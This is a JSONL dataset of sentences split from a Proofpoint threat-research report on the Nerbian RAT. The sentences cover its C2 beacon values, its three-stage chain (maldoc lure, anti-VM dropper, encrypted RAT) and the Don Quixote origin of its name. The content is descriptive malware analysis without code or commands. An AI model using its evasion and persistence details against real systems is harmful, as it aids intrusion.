{"id": "sentence_0x32676018", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "This string contains three values, concatenated and delimited with the \":\" character. Proofpoint assesses the first value, 8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d is some sort of an implant or campaign identifier, while 25b4ebca4bbc82ab5ae2e517c29d33e7 is a value derived from host identifier data collected using the go-smbios library mentioned above, while the final value is the operating system of the compromised host (windows)"}
{"id": "sentence_0xa68b1e70", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Figure 13: The process flow of Nerbian RAT"}
{"id": "sentence_0x14cbbd77", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x38bfae1b", "chapter_title": "Assessment", "text": "This is a complex piece of malware, consisting of three stages:"}
{"id": "sentence_0x235188f2", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x38bfae1b", "chapter_title": "Assessment", "text": "Maldoc phishing lure Dropper that performs a large variety of environment checking anti-reversing and anti-VM checks Nerbian RAT encrypted configuration file, extreme care to ensure data is encrypted to the C2"}
{"id": "sentence_0xe32041d5", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x38bfae1b", "chapter_title": "Assessment", "text": "Despite all this complexity and care being taken to protect the data in transit and \"vet\" the compromised host, the dropper and the RAT itself do not employ heavy obfuscation outside of the sample being packed with UPX, which it can be argued isn't necessarily for obfuscation, but to simply reduce the size of the executable."}
{"id": "sentence_0xaa9ecad6", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x38bfae1b", "chapter_title": "Assessment", "text": "Additionally, much of the functionality of both the RAT and the dropper are easy to infer due to the strings referring to GitHub repositories specifically the Chacal and screenshot repositories exposes partial functionality of both the dropper and the RAT."}
{"id": "sentence_0xe434acd6", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "At first it was hard to find any references to \"Nerbian\" on the internet, until Proofpoint analysts came across this passage in Don Quixote:"}
{"id": "sentence_0x4fa2b2dc", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "But turn thine eyes to the other side, and thou shalt see in front and"}
{"id": "sentence_0x183f8438", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "in the van of this other army the ever victorious and never vanquished"}
{"id": "sentence_0x839edfb0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "Timonel of Carcajona, prince of New Biscay, who comes in armour with"}
{"id": "sentence_0xed84aa9f", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "arms quartered azure, vert, white, and yellow, and bears on his shield"}
{"id": "sentence_0xa2faf634", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "a cat or on a field tawny with a motto which says Miau, which is the"}
{"id": "sentence_0xc2d91bc0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "beginning of the name of his lady, who according to report is the"}
{"id": "sentence_0x5c19e12c", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "peerless Miaulina, daughter of the duke Alfeniquen of the Algarve; the"}
{"id": "sentence_0x8c338b99", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "other, who burdens and presses the loins of that powerful charger"}
{"id": "sentence_0xa3c30efb", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "and bears arms white as snow and a shield blank and without any"}
{"id": "sentence_0xce688a61", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "device, is a novice knight, a Frenchman by birth, Pierres Papin by"}
{"id": "sentence_0x48b508ab", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "name, lord of the baronies of Utrique; that other, who with"}
{"id": "sentence_0xe401769e", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "iron-shod heels strikes the flanks of that nimble parti-coloured"}
{"id": "sentence_0x5c6236d3", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "zebra, and for arms bears azure vair, is the mighty duke of Nerbia,"}
{"id": "sentence_0x9cfb4068", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "Espartafilardo del Bosque, who bears for device on his shield an"}
{"id": "sentence_0x9f005a39", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "asparagus plant with a motto in Castilian that says, Rastrea mi"}
{"id": "sentence_0x8f8bf845", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "suerte.\""}
{"id": "sentence_0x353f7279", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "Nerbia is a fictional place from the great novel Don Quixote. The knight from Nerbia had a shield with a crest of asparagus and a banner reading \"Try your luck\"."}
{"id": "sentence_0x5bd99f03", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "Figure 14: Nerbia is a fictional land from the novel Don Quixote. The Knight of Nerbia wore a shield with an asparagus crest with a Castilian Spanish motto that reads \"Rastrea Mi Suerte.\" Which roughly translates to \"Try your luck.\" In English. Please note that this crest is not associated with the novel and was created because Threat Research at Proofpoint likes to have fun."}
{"id": "sentence_0x9bb5e057", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x4dcb251", "chapter_title": "Why Nerbian RAT?", "text": "Many of the strings referencing Nerbia were located in the companion dropper (UpdateUAV.exe). There are no references to Nerbia in the RAT payload itself (MoUsoCore.exe). Proofpoint assesses with high confidence that the dropper and RAT were both created by the same entity, and while the dropper may be modified to deliver different payloads in the future, the dropper is statically configured to download and establish persistence for this specific payload at the time of analysis."}
